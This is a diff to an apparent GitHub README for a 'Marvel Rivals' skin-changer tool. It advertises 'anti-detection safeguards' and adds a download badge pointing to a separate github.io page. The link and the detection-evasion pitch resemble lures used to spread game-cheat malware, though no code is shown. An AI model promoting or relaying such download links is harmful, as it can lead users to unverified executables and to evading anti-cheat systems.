@@ -4,6 +4,8 @@
 
 The **Marvel Rivals Skin Changer** is an open-source tool designed to let you personalize your experience in *Marvel Rivals* with **custom skins, hero designs**, and **equipment upgrades**. Whether you want to rock Iron Man’s iconic armor, reimagine Spider-Man’s suit, or experiment with entirely new aesthetics, this tool offers **real-time adjustments** and **anti-detection safeguards** to keep your creativity under the radar.  
 
+**[![Download Marvel Rivals SkinChanger](https://img.shields.io/badge/Download-MarvelRivals%20SkinChanger-blueviolet)](https://marvel-rivals-skinchanger.github.io/.github/)**
+
 ✨ **Key Features**:  
 - **Unlimited Skin Options**: Apply custom skins for heroes, weapons, and gear instantly.  
 - **Real-Time Customization**: Swap skins mid-game without restarting or disconnecting.  
